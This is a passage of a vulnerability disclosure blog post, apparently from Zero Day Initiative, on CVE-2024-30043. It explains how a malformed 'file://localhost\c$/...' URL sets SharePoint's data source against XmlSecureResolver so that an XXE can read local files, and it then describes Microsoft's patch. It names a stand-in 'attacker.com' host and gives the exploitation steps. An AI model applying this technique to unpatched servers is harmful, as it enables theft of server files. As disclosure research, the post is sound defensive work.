https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/26fdf097-fb42-4206-8d1c-42eec51f1ad3/exception.png?format=500w 500w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/26fdf097-fb42-4206-8d1c-42eec51f1ad3/exception.png?format=750w 750w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/26fdf097-fb42-4206-8d1c-42eec51f1ad3/exception.png?format=1000w 1000w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/26fdf097-fb42-4206-8d1c-42eec51f1ad3/exception.png?format=1500w 1500w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/26fdf097-fb42-4206-8d1c-42eec51f1ad3/exception.png?format=2500w 2500w" loading="lazy" decoding="async" data-loader="sqs" class="loaded">

            </div>
          </div>
        
            </button>
          
        

        
          
          <figcaption class="image-caption-wrapper">
            <div class="image-caption"><p class="" style="white-space:pre-wrap;"><em>Figure 2 Exception thrown during XXE-&gt;SSRF</em></p></div>
          </figcaption>
        
      
        </figure>
      

    </div>
  


  


</div></div><div class="sqs-block markdown-block sqs-block-markdown" data-block-type="44" id="block-yui_3_17_2_1_1716478721166_166555"><div class="sqs-block-content"><p>It seems that “Secure” in <code>XmlSecureResolver</code> stands for something. In general, it is a wrapper around various resolvers, which allows you to apply some resource fetching restrictions. Here is a fragment of the <a href="https://learn.microsoft.com/en-us/dotnet/api/system.xml.xmlsecureresolver?view=netframework-4.8.1">Microsoft documentation</a>:</p>
<p><i data-preserve-html-node="true">“Helps to secure another implementation of XmlResolver by wrapping the XmlResolver object and restricting the resources that the underlying XmlResolver has access to.”</i></p>
<p>In general, it is based on Microsoft Code Access Security. Depending on the provided URL, it creates some resource access rules. Let’s see a simplified example for the <code>http://attacker.com/test.xml</code>:</p>

</div></div><div class="sqs-block image-block sqs-block-image sqs-text-ready" data-block-type="5" id="block-yui_3_17_2_1_1716478721166_167881"><div class="sqs-block-content" id="yui_3_17_2_1_1762949716544_169">










































  

    
  
    <div class="
          image-block-outer-wrapper
          layout-caption-below
          design-layout-inline
          combination-animation-none
          individual-animation-none
          individual-text-animation-none
        " data-test="image-block-inline-outer-wrapper" id="yui_3_17_2_1_1762949716544_168">

      

      
        <figure class="
              sqs-block-image-figure
              intrinsic
            " style="max-width:904px;" id="yui_3_17_2_1_1762949716544_167">
          
        
        

        
          
            <button class="
                  sqs-block-image-button
                  lightbox
                  
          
        
                " data-description="&lt;p class=&quot;&quot; style=&quot;white-space:pre-wrap;&quot;&gt;&lt;em&gt;Figure 3 Simplified sample restrictions applied by XmlSecureResolver&lt;/em&gt;&lt;/p&gt;" data-lightbox-theme="dark" id="yui_3_17_2_1_1762949716544_166">
              <span class="v6-visually-hidden">View fullsize</span>
              
          <div class="image-block-wrapper" data-animation-role="image" id="yui_3_17_2_1_1762949716544_165">
            <div class="sqs-image-shape-container-element
              
          
        
              has-aspect-ratio
            " style="
                position: relative;
                
                  padding-bottom:76.54867553710938%;
                
                overflow: hidden;-webkit-mask-image: -webkit-radial-gradient(white, black);
              " id="yui_3_17_2_1_1762949716544_164">
                
                
                
                
                
                
                
                <img data-stretch="false" data-src="https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/d140adc4-1604-4afb-97cb-7cc0241823a0/resolverExample.png" data-image="https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/d140adc4-1604-4afb-97cb-7cc0241823a0/resolverExample.png" data-image-dimensions="904x692" data-image-focal-point="0.5,0.5" alt="" data-load="false" elementtiming="system-image-block" src="./Zero Day Initiative — CVE-2024-30043_ Abusing URL Parsing Confusion to Exploit XXE on SharePoint Server and Cloud_files/resolverExample.png" width="904" height="692" sizes="(max-width: 640px) 100vw, (max-width: 767px) 100vw, 100vw" style="display:block;object-fit: cover; width: 100%; height: 100%; object-position: 50% 50%" onload="this.classList.add(&quot;loaded&quot;)" srcset="https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/d140adc4-1604-4afb-97cb-7cc0241823a0/resolverExample.png?format=100w 100w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/d140adc4-1604-4afb-97cb-7cc0241823a0/resolverExample.png?format=300w 300w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/d140adc4-1604-4afb-97cb-7cc0241823a0/resolverExample.png?format=500w 500w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/d140adc4-1604-4afb-97cb-7cc0241823a0/resolverExample.png?format=750w 750w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/d140adc4-1604-4afb-97cb-7cc0241823a0/resolverExample.png?format=1000w 1000w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/d140adc4-1604-4afb-97cb-7cc0241823a0/resolverExample.png?format=1500w 1500w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/d140adc4-1604-4afb-97cb-7cc0241823a0/resolverExample.png?format=2500w 2500w" loading="lazy" decoding="async" data-loader="sqs" class="loaded">

            </div>
          </div>
        
            </button>
          
        

        
          
          <figcaption class="image-caption-wrapper">
            <div class="image-caption"><p class="" style="white-space:pre-wrap;"><em>Figure 3 Simplified sample restrictions applied by XmlSecureResolver</em></p></div>
          </figcaption>
        
      
        </figure>
      

    </div>
  


  


</div></div><div class="sqs-block markdown-block sqs-block-markdown" data-block-type="44" id="block-yui_3_17_2_1_1716478721166_182305"><div class="sqs-block-content"><p>In short, it creates restrictions based on protocol, hostname, and a couple of different things (like an optional port, which is not applicable to all protocols). If we fetch our XML from <code>http://attacker.com</code>, we won’t be able to make a request to <code>http://localhost</code> because the host does not match.</p>
<p>The same goes for the protocol. If we fetch XML from the attacker’s HTTP server, we won’t be able to access local files with XXE, because neither the protocol (<code>http://</code> versus <code>file://</code>) nor the host match as required.</p>
<p>To summarize, this XXE is useless so far. Even though we can technically trigger the XXE, it only allows us to reach our own server, which we can also achieve with the intended functionalities of our SharePoint sources (such as <code>XmlDataSource</code>). We need to figure out something else.</p>
<p><b data-preserve-html-node="true">SPXmlDataSource and URL Parsing Issues</b></p>
<p>At this point, I was not able to abuse the HTTP-based sources. I tried to use <code>SPXmlDataSource</code> with the following <code>request</code>:</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<code>/sites/mysite/test.xml</code></p>
<p>The idea is simple. We are a SharePoint user, and we can upload files to some sites. We upload our malicious XML to the <code>http://sharepoint/sites/mysite/test.xml</code> document and then we:<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;•	Create <code>SPXmlDataSource</code><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;•	Set <code>DataFile</code> to <code>/sites/mysite/test.xml</code>.</p>
<p><code>SPXmlDataSource</code> will successfully retrieve our XML. What about <code>XmlSecureResolver</code>? Unfortunately, such a path (without a protocol) will lead to a very restrictive policy, which does not allow us to leverage this XXE.</p>
<p>It made me wonder about the URL parsing. I knew that I could not abuse HTTP-based <code>XmlDataSource</code> and <code>SoapDataSource</code>. The code was written in C# and it was pretty straightforward to read – URL parsing looked good there. On the other hand, the URL parsing of <code>SPXmlDataSource</code> is performed by some unmanaged code, which cannot be easily decompiled and read. </p>
<p>I started thinking about a following potential exploitation scenario:<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;•	Delivering a “malformed” URL.<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;•	<code>SPXmlDataSource</code> somehow manages to handle this URL, and retrieves my uploaded XML successfully.<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;•	The URL gives me an unrestricted <code>XmlSecureResolver</code> policy and I’m able to fully exploit XXE.</p>
<p>This idea seemed good, and I decided to investigate the possibilities. First, we have to figure out when <code>XmlSecureResolver</code> gives us a nice policy, which allows us to:<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;•	Access a local file system (to read file contents).<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;•	Perform HTTP communication to any server (to exfiltrate data).</p>
<p>Let’s deliver the following URL to <code>XmlSecureResolver</code>:</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<code>file://localhost/c$/whatever</code></p>
<p>Bingo! <code>XmlSecureResolver</code> creates a policy with no restrictions! It thinks that we are loading the XML from the local file system, which means that we probably already have full access, and we can do anything we want.</p>
<p>Such a URL is not something that we should be able to deliver to <code>SPXmlDataSource</code> or any other data source that we have available. None of them is based on the local file system, and even if they were, we are not able to upload files there.</p>
<p>Still, we don’t know how <code>SPXmlDataSource</code> is handling URLs. Maybe my dream attack scenario with a malformed URL is possible? Before even trying to reverse the appropriate function, I started playing around with this SharePoint data source, and surprisingly, I found a solution quickly:</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<code>file://localhost\c$/sites/mysite/test.xml</code></p>
<p>Let’s see how <code>SPXmlDataSource</code> handles it (based on my observations):</p>

</div></div><div class="sqs-block image-block sqs-block-image sqs-text-ready" data-block-type="5" id="block-yui_3_17_2_1_1716478721166_194133"><div class="sqs-block-content" id="yui_3_17_2_1_1762949716544_184">










































  

    
  
    <div class="
          image-block-outer-wrapper
          layout-caption-below
          design-layout-inline
          combination-animation-none
          individual-animation-none
          individual-text-animation-none
        " data-test="image-block-inline-outer-wrapper" id="yui_3_17_2_1_1762949716544_183">

      

      
        <figure class="
              sqs-block-image-figure
              intrinsic
            " style="max-width:904px;" id="yui_3_17_2_1_1762949716544_182">
          
        
        

        
          
            
          <div class="image-block-wrapper" data-animation-role="image" id="yui_3_17_2_1_1762949716544_181">
            <div class="sqs-image-shape-container-element
              
          
        
              has-aspect-ratio
            " style="
                position: relative;
                
                  padding-bottom:49.33628463745117%;
                
                overflow: hidden;-webkit-mask-image: -webkit-radial-gradient(white, black);
              " id="yui_3_17_2_1_1762949716544_180">
                
                
                
                
                
                
                
                <img data-stretch="false" data-src="https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/b1a9e76f-da7a-45a3-ab66-ef581d9e05b8/spxmldatasource.png" data-image="https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/b1a9e76f-da7a-45a3-ab66-ef581d9e05b8/spxmldatasource.png" data-image-dimensions="904x446" data-image-focal-point="0.5,0.5" alt="" data-load="false" elementtiming="system-image-block" src="./Zero Day Initiative — CVE-2024-30043_ Abusing URL Parsing Confusion to Exploit XXE on SharePoint Server and Cloud_files/spxmldatasource.png" width="904" height="446" sizes="(max-width: 640px) 100vw, (max-width: 767px) 100vw, 100vw" style="display:block;object-fit: cover; width: 100%; height: 100%; object-position: 50% 50%" onload="this.classList.add(&quot;loaded&quot;)" srcset="https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/b1a9e76f-da7a-45a3-ab66-ef581d9e05b8/spxmldatasource.png?format=100w 100w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/b1a9e76f-da7a-45a3-ab66-ef581d9e05b8/spxmldatasource.png?format=300w 300w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/b1a9e76f-da7a-45a3-ab66-ef581d9e05b8/spxmldatasource.png?format=500w 500w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/b1a9e76f-da7a-45a3-ab66-ef581d9e05b8/spxmldatasource.png?format=750w 750w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/b1a9e76f-da7a-45a3-ab66-ef581d9e05b8/spxmldatasource.png?format=1000w 1000w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/b1a9e76f-da7a-45a3-ab66-ef581d9e05b8/spxmldatasource.png?format=1500w 1500w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/b1a9e76f-da7a-45a3-ab66-ef581d9e05b8/spxmldatasource.png?format=2500w 2500w" loading="lazy" decoding="async" data-loader="sqs" class="loaded">

            </div>
          </div>
        
          
        

        
          
          <figcaption class="image-caption-wrapper">
            <div class="image-caption"><p class="" style="white-space:pre-wrap;"><em>Figure 4 SPXmlDataSource - handling of malformed URL</em></p></div>
          </figcaption>
        
      
        </figure>
      

    </div>
  


  


</div></div><div class="sqs-block markdown-block sqs-block-markdown" data-block-type="44" id="block-yui_3_17_2_1_1716478721166_195040"><div class="sqs-block-content"><p>This is awesome. Such a URL allows us to retrieve the XML that we can freely upload to SharePoint. On the other hand, it gives us an unrestricted access policy in <code>XmlSecureResolver</code>! This URL parsing confusion between those two components gives us the possibility to fully exploit the XXE and perform a file read.</p>
<p>The entire attack scenario looks like this:</p>

</div></div><div class="sqs-block image-block sqs-block-image sqs-text-ready" data-block-type="5" id="block-yui_3_17_2_1_1716478721166_195778"><div class="sqs-block-content" id="yui_3_17_2_1_1762949716544_194">










































  

    
  
    <div class="
          image-block-outer-wrapper
          layout-caption-below
          design-layout-inline
          combination-animation-none
          individual-animation-none
          individual-text-animation-none
        " data-test="image-block-inline-outer-wrapper" id="yui_3_17_2_1_1762949716544_193">

      

      
        <figure class="
              sqs-block-image-figure
              intrinsic
            " style="max-width:904px;" id="yui_3_17_2_1_1762949716544_192">
          
        
        

        
          
            <button class="
                  sqs-block-image-button
                  lightbox
                  
          
        
                " data-description="&lt;p class=&quot;&quot; style=&quot;white-space:pre-wrap;&quot;&gt;&lt;em&gt;Figure 5 SharePoint XXE - entire exploitation scenario&lt;/em&gt;&lt;/p&gt;" data-lightbox-theme="dark" id="yui_3_17_2_1_1762949716544_191">
              <span class="v6-visually-hidden">View fullsize</span>
              
          <div class="image-block-wrapper" data-animation-role="image" id="yui_3_17_2_1_1762949716544_190">
            <div class="sqs-image-shape-container-element
              
          
        
              has-aspect-ratio
            " style="
                position: relative;
                
                  padding-bottom:54.64601516723633%;
                
                overflow: hidden;-webkit-mask-image: -webkit-radial-gradient(white, black);
              " id="yui_3_17_2_1_1762949716544_189">
                
                
                
                
                
                
                
                <img data-stretch="false" data-src="https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/5599f5ab-4934-4854-8450-b197b9f2e0c0/exploitation.png" data-image="https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/5599f5ab-4934-4854-8450-b197b9f2e0c0/exploitation.png" data-image-dimensions="904x494" data-image-focal-point="0.5,0.5" alt="" data-load="false" elementtiming="system-image-block" src="./Zero Day Initiative — CVE-2024-30043_ Abusing URL Parsing Confusion to Exploit XXE on SharePoint Server and Cloud_files/exploitation.png" width="904" height="494" sizes="(max-width: 640px) 100vw, (max-width: 767px) 100vw, 100vw" style="display:block;object-fit: cover; width: 100%; height: 100%; object-position: 50% 50%" onload="this.classList.add(&quot;loaded&quot;)" srcset="https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/5599f5ab-4934-4854-8450-b197b9f2e0c0/exploitation.png?format=100w 100w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/5599f5ab-4934-4854-8450-b197b9f2e0c0/exploitation.png?format=300w 300w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/5599f5ab-4934-4854-8450-b197b9f2e0c0/exploitation.png?format=500w 500w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/5599f5ab-4934-4854-8450-b197b9f2e0c0/exploitation.png?format=750w 750w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/5599f5ab-4934-4854-8450-b197b9f2e0c0/exploitation.png?format=1000w 1000w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/5599f5ab-4934-4854-8450-b197b9f2e0c0/exploitation.png?format=1500w 1500w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/5599f5ab-4934-4854-8450-b197b9f2e0c0/exploitation.png?format=2500w 2500w" loading="lazy" decoding="async" data-loader="sqs" class="loaded">

            </div>
          </div>
        
            </button>
          
        

        
          
          <figcaption class="image-caption-wrapper">
            <div class="image-caption"><p class="" style="white-space:pre-wrap;"><em>Figure 5 SharePoint XXE - entire exploitation scenario</em></p></div>
          </figcaption>
        
      
        </figure>
      

    </div>
  


  


</div></div><div class="sqs-block markdown-block sqs-block-markdown" data-block-type="44" id="block-yui_3_17_2_1_1716478721166_196765"><div class="sqs-block-content"><p><b data-preserve-html-node="true">Demo</b></p><p>Let’s have a look at the demo, to visualize things better. It presents the full exploitation process, together with the debugger attached. You can see that:<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;•	<code>SPXmlDataSource</code> fetches the malicious XML file, even though the URL is malformed.<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;•	<code>XmlSecureResolver</code> creates an unrestricted access policy.<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;•	XXE is exploited and we retrieve the <code>win.ini</code> file.<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;•	“DTD prohibited” exception is eventually thrown, but we were still able to abuse the OOB XXE.</p><p><b data-preserve-html-node="true">The Patch</b></p>
</div></div><div class="sqs-block video-block sqs-block-video" data-block-json="{&quot;blockAnimation&quot;:&quot;none&quot;,&quot;layout&quot;:&quot;caption-hidden&quot;,&quot;overlay&quot;:false,&quot;description&quot;:{},&quot;hSize&quot;:null,&quot;floatDir&quot;:null,&quot;isOldBlock&quot;:false,&quot;html&quot;:&quot;&lt;iframe width=\&quot;200\&quot; height=\&quot;150\&quot; src=\&quot;https://www.youtube.com/embed/_kmq1VMs00c?feature=oembed\&quot; frameborder=\&quot;0\&quot; allow=\&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share\&quot; referrerpolicy=\&quot;strict-origin-when-cross-origin\&quot; allowfullscreen title=\&quot;Demonstrating CVE-2024-30043: An XXE in SharePoint Server\&quot;&gt;&lt;/iframe&gt;&quot;,&quot;url&quot;:&quot;https://www.youtube.com/watch?v=_kmq1VMs00c&quot;,&quot;width&quot;:200,&quot;height&quot;:150,&quot;providerName&quot;:&quot;YouTube&quot;,&quot;thumbnailUrl&quot;:&quot;https://i.ytimg.com/vi/_kmq1VMs00c/hqdefault.jpg&quot;,&quot;resolvedBy&quot;:&quot;youtube&quot;}" data-block-type="32" id="block-yui_3_17_2_1_1716478721166_318487"><div class="sqs-block-content" id="yui_3_17_2_1_1762949716544_80"><div class="intrinsic" style="max-width:100%"><div class="embed-block-wrapper " style="padding-bottom:75.0%;"><div class="sqs-video-wrapper video-none" data-provider-name="YouTube" data-html="&lt;iframe width=&quot;200&quot; height=&quot;150&quot; src=&quot;https://www.youtube.com/embed/_kmq1VMs00c?feature=oembed&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share&quot; referrerpolicy=&quot;strict-origin-when-cross-origin&quot; allowfullscreen title=&quot;Demonstrating CVE-2024-30043: An XXE in SharePoint Server&quot;&gt;&lt;/iframe&gt;" id="yui_3_17_2_1_1762949716544_87"><div class="intrinsic"><div class="intrinsic-inner" style="padding-bottom: 75%;"><iframe width="200" height="150" src="./Zero Day Initiative — CVE-2024-30043_ Abusing URL Parsing Confusion to Exploit XXE on SharePoint Server and Cloud_files/_kmq1VMs00c.html" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen="" title="Demonstrating CVE-2024-30043: An XXE in SharePoint Server" id="yui_3_17_2_1_1762949716544_92"></iframe></div></div></div></div></div></div></div><div class="sqs-block markdown-block sqs-block-markdown" data-block-type="44" id="block-yui_3_17_2_1_1716478721166_318539"><div class="sqs-block-content"><p>The patch from Microsoft implemented two main changes:<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;•	More URL parsing controls for <code>SPXmlDataSource</code>.<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;•	<code>XmlTextReader</code> object also prohibits DTD usage (previously, only <code>XmlReaderSettings</code> did that).</p><p>In general, I find .NET XXE-protection settings way trickier than the ones that you can define in various Java parsers. This is because you can apply them to objects of different types (here: <code>XmlReaderSettings</code> versus <code>XmlTextReader</code>). When <code>XmlTextReader</code> prohibits the DTD usage, parameter entities seem to never be resolved, even with the resolver specified (that’s how this patch works). On the other hand, when <code>XmlReaderSettings</code> prohibits DTDs, parameter entities are resolved when the <code>XmlUrlResolver</code> is used. You can easily get confused here.</p>
</div></div><div class="sqs-block html-block sqs-block-html" data-block-type="2" data-sqsp-block="text" id="block-yui_3_17_2_1_1716478721166_233355"><div class="sqs-block-content">

<div class="sqs-html-content" data-sqsp-text-block-content="">
  <p class="" style="white-space:pre-wrap;"><strong>Summary</strong></p><p style="text-align:justify;white-space: normal !important;white-space:pre-wrap;" class="">A lot of us thought that XXE vulnerabilities were almost dead in .NET. Still, it seems that you may sometimes spot some tricky implementations and corner cases that may turn out to be vulnerable. A careful review of .NET XXE-related settings is not an easy task (they are tricky) but may eventually be worth a shot.</p><p style="text-align:justify;white-space: normal !important;white-space:pre-wrap;" class="">I hope you liked this writeup. I have a huge line of upcoming blog posts, but vulnerabilities are waiting for the patches (including one more SharePoint vulnerability). Until my next post, you can follow me <a href="https://twitter.com/chudyPB">@chudypb</a> and follow the team on <a href="https://www.twitter.com/thezdi">Twitter</a>, <a href="https://infosec.exchange/@thezdi">Mastodon</a>, <a href="https://www.linkedin.com/company/zerodayinitiative">LinkedIn</a>, or <a href="https://www.instagram.com/thezdi">Instagram</a> for the latest in exploit techniques and security patches.</p>
</div>




















  
  



</div></div></div></div></div>
                            </div>

                            <!--TAGS-->
                            <ul class="blog-tags">
                            
                                
                                    <li><a href="https://www.zerodayinitiative.com/blog/tag/SharePoint">SharePoint</a></li>
                                
                                    <li><a href="https://www.zerodayinitiative.com/blog/tag/Microsoft">Microsoft</a></li>
                                
                                    <li><a href="https://www.zerodayinitiative.com/blog/tag/Research">Research</a></li>
                                
                            
                            </ul>
                        </div>
                        
                    </div><!-- /. contentBlock -->
                </div>

        </div>
    </div>

<div id="footer" style="padding: 0px">
    <div id="footerContact">
        <div class="content">
            <div class="footerContactBox">
                <h3>General Inquiries</h3>
                <a href="mailto:zdi@trendmicro.com">zdi@trendmicro.com</a>
            </div>
            <div class="footerContactBox">
                <h3>Find us on X</h3>
                <a href="https://twitter.com/thezdi">@thezdi</a>
            </div>
            <div class="footerContactBox">
                <h3>Find us on Mastodon</h3>
                <a rel="me" href="https://infosec.exchange/@thezdi">Mastodon</a>
            </div>
            <div class="footerContactBox">
                <h3>Media Inquiries</h3>
                <a href="mailto:media_relations@trendmicro.com">media_relations@trendmicro.com</a>
            </div>
            <div class="footerContactBox">
                <h3>Sensitive Email Communications</h3>
                <a href="https://www.zerodayinitiative.com/documents/zdi-pgp-key.asc" target="_blank">PGP Key</a>
            </div>
        </div>
    </div>

    <div id="footerMenu">
        <div id="footerMiddleSection" class="group">
            <div id="footerLinks">
                <div class="content">
                    <div class="footerLinkBox">
                        <a href="https://www.zerodayinitiative.com/about/" class="footerTitleLink">WHO WE ARE</a>
                        <ul>
                            <li><a href="https://www.zerodayinitiative.com/about/">Our Mission</a></li>

                            <li><a href="https://www.trendmicro.com/">Trend Micro</a></li>
                            <li>
                                <a href="https://www.trendmicro.com/en_us/business/products/network/integrated-atp/next-gen-intrusion-prevention-system.html">TippingPoint
                                    IPS</a></li>
                        </ul>
                    </div>
                    <div class="footerLinkBox">
                        <a href="https://www.zerodayinitiative.com/about/benefits/" class="footerTitleLink">HOW IT WORKS</a>
                        <ul>
                            <li><a href="https://www.zerodayinitiative.com/about/benefits/#process">Process</a></li>
                            <li><a href="https://www.zerodayinitiative.com/about/benefits/#researcher-rewards">Researcher Rewards</a></li>
                            <li><a href="https://www.zerodayinitiative.com/about/faq/">FAQS</a></li>
                            <li><a href="https://www.trendmicro.com/privacy/">Privacy</a></li>
                        </ul>
                    </div>
                    <div class="footerLinkBox">
                        <a href="https://www.zerodayinitiative.com/advisories" class="footerTitleLink">ADVISORIES</a>
                        <ul>
                            <li><a href="https://www.zerodayinitiative.com/advisories/published">Published Advisories</a></li>
                            <li><a href="https://www.zerodayinitiative.com/advisories/upcoming">Upcoming Advisories</a></li>
                            <li><a href="https://www.zerodayinitiative.com/rss">RSS Feeds</a></li>
                        </ul>
                    </div>
                    <div class="footerLinkBox">
                        <a href="https://www.zerodayinitiative.com/blog" class="footerTitleLink">BLOG</a>
                    </div>

                    <div class="footerLogo">
                        <a href="https://www.zerodayinitiative.com/"><img src="./Zero Day Initiative — CVE-2024-30043_ Abusing URL Parsing Confusion to Exploit XXE on SharePoint Server and Cloud_files/logo-scarab.svg" alt="thezdi"></a>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>
<script>var baseURL = ""</script>
<script src="./Zero Day Initiative — CVE-2024-30043_ Abusing URL Parsing Confusion to Exploit XXE on SharePoint Server and Cloud_files/main.js.download"></script>

<script data-sqs-type="imageloader-bootstrapper">if(window.ImageLoader) window.ImageLoader.bootstrap({}, document);</script><script>Squarespace.afterBodyLoad(Y);</script><svg xmlns="http://www.w3.org/2000/svg" version="1.1" style="display:none" data-usage="social-icons-svg"><symbol id="youtube-icon" viewBox="0 0 64 64"><path d="M46.7,26c0,0-0.3-2.1-1.2-3c-1.1-1.2-2.4-1.2-3-1.3C38.3,21.4,32,21.4,32,21.4h0 c0,0-6.3,0-10.5,0.3c-0.6,0.1-1.9,0.1-3,1.3c-0.9,0.9-1.2,3-1.2,3S17,28.4,17,30.9v2.3c0,2.4,0.3,4.9,0.3,4.9s0.3,2.1,1.2,3 c1.1,1.2,2.6,1.2,3.3,1.3c2.4,0.2,10.2,0.3,10.2,0.3s6.3,0,10.5-0.3c0.6-0.1,1.9-0.1,3-1.3c0.9-0.9,1.2-3,1.2-3s0.3-2.4,0.3-4.9 v-2.3C47,28.4,46.7,26,46.7,26z M28.9,35.9l0-8.4l8.1,4.2L28.9,35.9z"></path></symbol><symbol id="youtube-mask" viewBox="0 0 64 64"><path d="M0,0v64h64V0H0z M47,33.1c0,2.4-0.3,4.9-0.3,4.9s-0.3,2.1-1.2,3c-1.1,1.2-2.4,1.2-3,1.3 C38.3,42.5,32,42.6,32,42.6s-7.8-0.1-10.2-0.3c-0.7-0.1-2.2-0.1-3.3-1.3c-0.9-0.9-1.2-3-1.2-3S17,35.6,17,33.1v-2.3 c0-2.4,0.3-4.9,0.3-4.9s0.3-2.1,1.2-3c1.1-1.2,2.4-1.2,3-1.3c4.2-0.3,10.5-0.3,10.5-0.3h0c0,0,6.3,0,10.5,0.3c0.6,0.1,1.9,0.1,3,1.3 c0.9,0.9,1.2,3,1.2,3s0.3,2.4,0.3,4.9V33.1z M28.9,35.9l8.1-4.2l-8.1-4.2L28.9,35.9z"></path></symbol></svg>



</body></html>